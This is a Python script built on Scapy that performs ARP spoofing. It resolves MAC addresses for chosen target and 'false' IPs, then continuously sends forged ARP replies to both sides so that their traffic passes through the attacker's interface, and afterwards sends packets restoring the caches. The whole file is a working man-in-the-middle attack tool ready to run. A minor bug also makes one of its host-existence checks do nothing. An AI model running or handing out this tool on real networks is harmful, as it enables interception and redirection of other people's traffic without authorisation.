from scapy.all import *
import sys
import re

def getOptions():
    options=dict()
    key=None
    for each in sys.argv[1:]:
        if key==None:
            key=each
        else:
            options[key]=each
            key=None
    return options

def printHelp():
    print("python arpspoof.py <-t Target|-T TargetsFile> <-f FalseIP|-F FalseIPsFile> [-i Interface]\r\n\n",end="")
    print("\t-t\tA target you will spoof.\r\n",end="")
    print("\t-T\tA file of targets.\r\n",end="")
    print("\t-f\tA false IP.\r\n",end="")
    print("\t-F\tA file of false IPs.\r\n",end="")

regExpOfIp=re.compile(r'(?:(?<=[^0-9.])|(?<=^))(?:(?:(?:[01]?\d?\d)|(?:2[0-4]\d)|(?:25[0-5]))\.){3}(?:(?:[01]?\d?\d)|(?:2[0-4]\d)|(?:25[0-5]))(?:(?=[^0-9.])|(?=$))')

def getTargets(options):
    if "-T" not in options:
        if "-t" not in options:
            return None
        else:
            return [options["-t"]]
    else:
        targets=[]
        with open(options["-T"],"r") as f:
            targets=regExpOfIp.findall(f.read())
        return targets

def getFalseIps(options):
    if "-F" not in options:
        if "-f" not in options:
            return None
        else:
            return [options["-f"]]
    else:
        falseIps=[]
        with open(options["-F"],"r") as f:
            falseIps=regExpOfIp.findall(f.read())
        return falseIps

def getMacByIps(ips):
    pkt=Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ips,op=1)
    res=srp(pkt,iface=iface,timeout=5)
    mac=dict()
    for each in res[0]:
        mac[each[1][ARP].psrc]=each[1][ARP].hwsrc
    return mac

def arpSpoof(targets_mac,falseIps_mac):
    pktlist=[]
    for target in targets_mac:
        for falseIp in falseIps_mac:
            pktlist.append(Ether(src=get_if_hwaddr(iface),dst=targets_mac[target])/ARP(psrc=falseIp,hwsrc=get_if_hwaddr(iface),pdst=target,hwdst=targets_mac[target],op=2))
            pktlist.append(Ether(src=get_if_hwaddr(iface),dst=falseIps_mac[falseIp])/ARP(psrc=target,hwsrc=get_if_hwaddr(iface),pdst=falseIp,hwdst=falseIps_mac[falseIp],op=2))
    print("[*] Start Arp spoofing.\r\n",end="")
    try:
        sendp(pktlist,loop=1)
    except KeyboardInterrupt:
        pass
    print("[*] Arp spoof finshed.\r\n",end="")

def restore(targets_mac,falseIps_mac):
    pktlist=[]
    for target in targets_mac:
        for falseIp in falseIps_mac:
            pktlist.append(Ether(src=falseIps_mac[falseIp],dst=targets_mac[target])/ARP(psrc=falseIp,hwsrc=falseIps_mac[falseIp],pdst=target,hwdst=targets_mac[target],op=2))
            pktlist.append(Ether(src=targets_mac[target],dst=falseIps_mac[falseIp])/ARP(psrc=target,hwsrc=targets_mac[target],pdst=falseIp,hwdst=falseIps_mac[falseIp],op=2))
    sendp(pktlist)

conf.verb=0
options=getOptions()
targets=getTargets(options)
falseIps=getFalseIps(options)
if targets==None:
    print("[!] Arg Error.You must fill in the \"-t\" or \"-T\" argument.\r\n",end="")
if falseIps==None:
    print("[!] Arg Error.You must fill in the \"-f\" or \"-F\" argument.\r\n",end="")
if targets==None or falseIps==None:
    printHelp()
    exit()
iface=options["-i"] if "-i" in options else conf.iface
print("[*] Finished to read argument.\r\n",end="")
targets_mac=getMacByIps(targets)
print("[*] Finished to get targets mac address.\r\n",end="")
falseIps_mac=getMacByIps(falseIps)
print("[*] Finished to get false IPs mac address.\r\n",end="")
for each in targets:
    if each not in targets_mac:
        print("[!] Host Error.Can\'t find the host %s.\r\n"%(each),end="")
for each in falseIps_mac:
    if each not in falseIps_mac:
        print("[!] Host Error.Can\'t find the host %s.\r\n"%(each),end="")
arpSpoof(targets_mac,falseIps_mac)
restore(targets_mac,falseIps_mac)
